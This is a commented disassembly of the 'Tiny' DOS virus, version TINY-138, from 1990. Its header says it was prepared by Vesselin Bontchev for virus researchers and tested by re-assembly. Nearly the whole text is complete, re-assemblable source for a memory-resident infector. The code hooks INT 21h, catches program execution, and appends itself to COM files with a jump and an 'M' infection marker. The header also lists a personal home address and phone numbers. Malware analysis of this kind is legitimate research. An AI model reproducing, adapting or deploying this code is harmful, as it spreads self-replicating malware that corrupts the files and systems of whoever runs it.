	page	,132
	name	TINY138
	title	The 'Tiny' virus, version TINY-138
	.radix	16

; ษออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
; บ  Bulgaria, 1404 Sofia, kv. "Emil Markov", bl. 26, vh. "W", et. 5, ap. 51 บ
; บ  Telephone: Private: +359-2-586261, Office: +359-2-71401 ext. 255	     บ
; บ									     บ
; บ			 The 'Tiny' Virus, version TINY-138                  บ
; บ		 Disassembled by Vesselin Bontchev, September 1990	     บ
; บ									     บ
; บ		     Copyright (c) Vesselin Bontchev 1989, 1990 	     บ
; บ									     บ
; บ	 This listing is only to be made available to virus researchers      บ
; บ		   or software writers on a need-to-know basis. 	     บ
; ศออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ

; The disassembly has been tested by re-assembly using MASM 5.0.

code	segment
	assume	cs:code, ds:code

	org	100

seg_60	equ	600
v_len	equ	v_end-first4

start:
	jmp	v_entry 	; Jump to virus code
	db	'M'             ; Virus signature
	mov	ax,4C00 	; Program terminate
	int	21

; The original first 4 bytes of the infected file:

first4	db	0EBh, 2, 90, 90

v_entry:
	mov	si,0FF		; Initialize some registers
	mov	di,offset start ; Put the addres of program start in DI
	mov	bx,int_21-first4+seg_60 ; Point BX at new INT 13h handler

; The virus will be installed in memory at
; address 0050:0100h (i.e., at segment 60h):

	mov	cx,50

	add	si,[si+2]	; Determine the start addres of the virus body

	push	di		; Now a Near RET instruction will run the prg.

	movsw			; Restore the original first 4 bytes
	movsw

	mov	es,cx		; Point ES:DI at 0050:0100h
	cmpsb			; Check if the virus is present in memory
	jz	run		; Just run the program if so

; Virus not in memory. Install it there:

	dec	si		; Correct SI & DI to point at the start of
	dec	di		;  virus code and to destination address
	rep	movsw		; Move the virus there

	mov	es,cx		; ES := 0

; Move the INT 21h handler to INT 32h and
; install int_21 as new INT 21h handler.
; By the way, now DI == 1A4h (i.e., 69h*4):

	xchg	ax,bx		; Thransfer INT 21h vector to INT 69h,
	xchg	ax,cx		;  preserving AX
lp:
	xchg	ax,cx		; Get a word
	xchg	ax,es:[di-(69-21)*4]	; Swap the two words
	stosw			; Save the word
	jcxz	lp		; Loop until done (two times)

	xchg	ax,bx		; Restore AX (to keep progs as DISKCOPY happy)

run:
	push	ds		; Restore ES
	pop	es
	ret			; And exit (go to CS:100h)

int_21: 			; New INT 21h handler
	cmp	ax,4B00 	; EXEC function call?
	jne	end_21		; Exit if not

	push	ax		; Save registers used
	push	bx
	push	dx
	push	ds
	push	es

	mov	ax,3D02 	; Open the file for both reading and writting
	call	do_int21
	jc	end_exec	; Exit on error

	cbw			; Zero AH
	cwd			; Zero DX
	mov	bx,si		; Save handle in BX
	mov	ds,ax		; Set DS and ES to 60h,
	mov	es,ax		;  the virus data segment

	mov	ah,3F		; Read the first 4 bytes
	int	69

; Check whether the file is already infected or is an .EXE file.
; The former contains the character `M' in its 3rd byte and
; the latter contains it either in the 0th or in the 1st byte.

	mov	al,'M'          ; Look for `M'
	repne	scasb
	jz	close		; Exit if file not suitable for infection

	mov	al,2		; Seek to the end of file
	call	lseek		; SI now contains the file size

	mov	cl,v_len	; Length of virus body
	int	69		; Append the virus to the file (AH is now 40h)

	mov	al,0E9		; Near JMP opcode
	stosb			; Form the first instruction of the file
	inc	si		; Add 1 to file size for the JMP
	xchg	ax,si		; Move it in AX
	stosw			; Form the JMP's opperand
	mov	al,'M'          ; Add a `M' character to mark the file
	stosb			;  as infected

	xchg	ax,dx		; Zero AX
	call	lseek		; Seek to the beginning
	int	69		; AH is 40h, write the JMP instruction

close:
	mov	ah,3E		; Close the file
	int	69

end_exec:
	pop	es		; Restore used registers
	pop	ds
	pop	dx
	pop	bx
	pop	ax

; Exit through the original INT 21h handler:

end_21:
	jmp	dword ptr cs:[69*4]

lseek:
	mov	ah,42		; Seek operation
	cwd			; Zero DX
do_int21:
	xor	cx,cx		; External entry for Open
	int	69
	mov	cl,4		; 4 bytes will be read/written
	xchg	ax,si		; Store AX in SI
	mov	ax,4060 	; Prepare AH for Write
	xor	di,di		; Zero DI
	ret			; Done

v_end	equ	$		; End of virus body

code	ends
	end	start
